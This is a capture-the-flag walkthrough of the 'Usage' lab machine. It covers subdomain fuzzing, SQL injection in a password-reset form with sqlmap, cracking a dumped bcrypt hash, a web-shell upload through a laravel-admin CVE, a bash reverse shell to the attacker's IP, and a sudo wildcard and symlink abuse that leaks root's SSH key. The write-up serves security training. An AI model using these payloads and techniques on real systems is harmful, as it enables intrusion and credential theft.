# Usage Walkthrough

## Recon

### nmap

First I use nmap to find any open ports

#### nmap -p- --min-rate 10000 10.129.5.148

So we have 2 ports open 22 and 80

PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  

Then let's check the version

#### nmap -p 22,80 -sCV 10.129.5.148

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)  
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)  
80/tcp open  http    nginx 1.18.0 (Ubuntu)  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://usage.htb/  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Based on the openssh verion, the host is likely running Ubuntu 22.04 jammy

There’s a redirect on the webserver to usage.htb.

### Fuzz the subdomain with TCP port 80

Let's find the subdomain

#### ffuf -u http://10.129.5.148 -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

admin                   [Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 1414ms]  

I find the admin.usage.htb. I will add these to /etc/hosts

#### echo '10.129.5.148 usage.htb admin.usage.htb' | sudo tee -a /etc/hosts

Let's check out the usage.htb with port 80

<img src = "Images/Usage1.png" style="width: 80%;">

At the top right, there are three links that lead to this login form (/index.php/login), the registration form (/index.php/registration), and http://admin.usage.htb/.

I also see “Reset Password” link (/forgot-password) that leads to a form that asks for an email address:

If I enter an email that doesn’t exist, it will say Email address does not match in our record

So I go ahead and register the email

Then

Registering redirects to the login page, and logging leads to a page with some posts on it:

<img src = "Images/Usage2.png" style="width: 80%;">

Nothing is interest beside it mentions some Laravel

URL path’s contain index.php

The 404 page is the classic Laravel default 404 page with grey text on a blue background

So I check HTTP response header

#### curl -I http://usage.htb 
HTTP/1.1 200 OK  
Server: nginx/1.18.0 (Ubuntu)  
Content-Type: text/html; charset=UTF-8  
Connection: keep-alive  
Cache-Control: no-cache, private  
Date: Fri, 29 May 2026 01:25:21 GMT  
Set-Cookie:   XSRF-TOKEN=eyJpdiI6InZ6SE5lcE50LzU4aUN5ZDR1eUxEZlE9PSIsInZhbHVlIjoiYjUrM1JJN1pmSGJ3MTlJZ1VtRCt5UGhvMkNaM2FGcFRVcUczZmFzNER4OUhTN0N4Ulo4eDIrbUlFZGVEZjVC  c3BrcjV4cEo4TXI3ZWNJYUVlTituWDBQaTFCWXpJdnlXNUNpMFBaWFFtVUlodW1vc3NkUWdWVG5USHMzenBJNTMiLCJtYWMiOiIzOTkxZjE5ZWI3Y2U2MDUzZjBlOWQ0Zjg3ODgwN2E3ZDQ1ZGU3MGU  zMjZhYmViMTI2OGIxZmQ1MDNkYTY3NDFkIiwidGFnIjoiIn0%3D; expires=Fri, 29 May 2026 03:25:21 GMT; Max-Age=7200; path=/; samesite=lax  
Set-Cookie:   laravel_session=eyJpdiI6IncvV3pzYmtiWVlJR05CVGxSWmhyWEE9PSIsInZhbHVlIjoiS3J4eEQwbmNVak5Yb3YyTTFKVkdhRHZZQVZhN3hnV241RGNVbVV6bU1RS2lGdy9CT1NxMnRRNVZrOFl  GRFk5cnVmdjZDZkU2MWg1SnNieFBaaWpNVW1tQVJhcEViVkpSS3dWU2oweGN4UkFDZzRjU0txdGNwZDJGNlBVcmY5dG8iLCJtYWMiOiIyZjAyNzRhMGRmOTY3OWI0MWNkOGQ0MjE4MDQ2ZmZhZmQ1Yz  A5YmY1OTljYmM5NDllMjMzZjVkNDM1OGRhNmFmIiwidGFnIjoiIn0%3D; expires=Fri, 29 May 2026 03:25:21 GMT; Max-Age=7200; path=/; httponly; samesite=lax  
X-Frame-Options: SAMEORIGIN  
X-XSS-Protection: 1; mode=block  
X-Content-Type-Options: nosniff  

So Laravel always sets a XSRF-TOKEN and [app]_session cookies. By default the [app] is laravel, but the application can also change that.

Let's do some directory brute force

#### feroxbuster -u http://usage.htb -x php

I received bunch of error 

Now I gear toward admin.usage.htb that I found before

<img src = "Images/Usage3.png" style="width: 80%;">

So I used my credential from the other page but not working. The 404 page is same and loads /index.php

### Shell as dash

Let's do SQL injection

I do this select * from users where email = '{my input}'; in reset password field

<img src = "Images/Usage4.png" style="width: 80%;">

And the page returns 500 in usage.htb

if I send ' or 1=1 limit 1;-- -,

I can do this 

#### select * from users where email = '' or 1=1;-- -';

<img src = "Images/Usage5.png" style="width: 80%;">

And I saw some SQL injection in place.

I capture request using burp suite with this URL http://usage.htb/forget-password

I right click to save the request to local

Let's do some SQL map

#### sqlmap -r resetpassword.req --batch

It fails. I try to increase the bigger scope

[] [WARNING] HTTP error codes detected during run:  
500 (Internal Server Error) - 40 times  

#### sqlmap -r resetpassword.req --level 5 --risk 3 --threads 10 -p email --batch

Let's some Database enum

#### sqlmap -r resetpassword.req --level 5 --risk 3 --threads 2 -p email --batch --dbs 

For some reason it show some hex

So i do

#### sqlmap -r resetpassword.req -p email --dbms="MySQL" --dbs

available databases [3]:  
[*] information_schema  
[*] performance_schema  
[*] usage_blog  

So information_schema and performance_schema are related to MySQL, where as usage_blog is related to the website. To list the tables in usage_blog, I’ll replace --dbs with -D usage_blog --tables

#### sqlmap -r resetpassword.req -p email --dbms="MySQL" -D usage_blog --tables --batch

It shows me 15 tables

Database: usage_blog  
[15 tables]  
+------------------------+  
| admin_menu             |  
| admin_operation_log    |  
| admin_permissions      |  
| admin_role_menu        |  
| admin_role_permissions |  
| admin_role_users       |  
| admin_roles            |  
| admin_user_permissions |  
| admin_users            |  
| blog                   |  
| failed_jobs            |  
| migrations             |  
| password_reset_tokens  |  
| personal_access_tokens |  
| users                  |  
+------------------------+  

I will dump admin user

#### sqlmap -r resetpassword.req -p email --dbms="MySQL" -D usage_blog -T admin_users --dump --batch

It tooks a bit to dump

Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+

So now I save that hash to a file

#### hashcat admin.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

25600 | bcrypt(md5($pass))                                         | Generic KDF  
25800 | bcrypt(sha1($pass))                                        | Generic KDF  
30600 | bcrypt(sha256($pass))                                      | Generic KDF  
28400 | bcrypt(sha512($pass))                                      | Generic KDF  
3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System  
33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce  

The last three are cases where the password is hashes first with an older hashing format and then with bcrypt.

It makes sense to go with 3200

#### hashcat admin.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -m 3200

$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1  
                                                            
Session..........: hashcat  
Status...........: Cracked  

On my end, it cracks in a few seconds to “whatever1” and username is Admin

And i am in

<img src = "Images/Usage6.png" style="width: 80%;">

The admin panel is powered by encore/laravel-admin in version 1.8.18

So now i google laravel-admin 1.8.18 cve

=> So it will be CVE-2023-24249

I will create simple file name ad.php

I tried to update but it rejects so I upload as jpg extension ad.php.jpg

<img src = "Images/Usage7.png" style="width: 80%;">

It seems okay so I will upload. Upon the refresh, the avatar is broken let's have burp intercept

I edit file in Burp file jpg to php again

then the page get cmd

<img src = "Images/Usage8.png" style="width: 80%;">

Let's get the shell

#### http://admin.usage.htb/uploads/images/ad.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.15.175/443 0>%261'

Finally I received

nc -lnvp 443  
listening on [any] 443 ...  
connect to [10.10.15.175] from (UNKNOWN) [10.129.5.148] 39500  
bash: cannot set terminal process group (1080): Inappropriate ioctl for device  
bash: no job control in this shell  
dash@usage:/var/www/html/project_admin/public/uploads/images$  

Standard script

#### script /dev/null -c bash

then ctrl Z

then do stty raw -echo; fg

I type "reset" then "screen"


Then I cd ~ meaning go to user home directory

dash@usage:~$ cat user.txt

c5df100c9213b20c6d5eb9a102eacb17


### Shell as xander

dash@usage:/home$ ls  
dash  xander  

There are 2 users

then i grep
#### grep 'sh$' /etc/passwd

and dash cannot access xander’s home directory.

So I ls -la in Home Directory

There are four related to Monit, which describes itself Open Source utility for managing and monitoring Unix systems

So i cat

#### cat .monitrc 

#Enable Web Access  
set httpd port 2812  
     use address 127.0.0.1  
     allow admin:3nc0d3d_pa$$w0rd  


Then I log in as xander

xander@usage:~$ id  
uid=1001(xander) gid=1001(xander) groups=1001(xander)  

#### sudo -l
So xander do have sudo access to run the usage_management script as any user without a password:

User xander may run the following commands on usage:  
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management  
  
Then

#### file /usr/bin/usage_management 

#### md5sum /usr/bin/usage_management  
xander@usage:~$ md5sum /usr/bin/usage_management  
f3c1b2b1ccacc24cc7ed8f3ad62bb7c6  /usr/bin/usage_management  

=> I check VirusTotal and nothing over there. I guess it is only customer to Usage box


Then I do 

#### sudo usage_management 

So I can do 

#### strings /usr/bin/usage_management

So here is what I did

#### cd /var/www/html

#### touch @root.txt

#### ln -s /root/root.txt root.txt

#### sudo /usr/bin/usage_management

Then I choose option 1

Okay i got the root

Scan WARNINGS for files and folders:

8e1757a86fc0d8d8a339f96ae1982eca : No more files

So the flag is 8e1757a86fc0d8d8a339f96ae1982eca

---
I also tried the other way to get root

#### touch @ad; ln -fs /root/.ssh/id_rsa ad

#### sudo usage_management

Choose option 1

It gives me the private key

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----

I save to local and ssh -i root_id_rsa root@usage.htb 

root@usage:~# whoami  
root  
root@usage:~# ls  
cleanup.sh  root.txt  snap  usage_management.c  
root@usage:~# cat root.txt  
8e1757a86fc0d8d8a339f96ae1982eca  

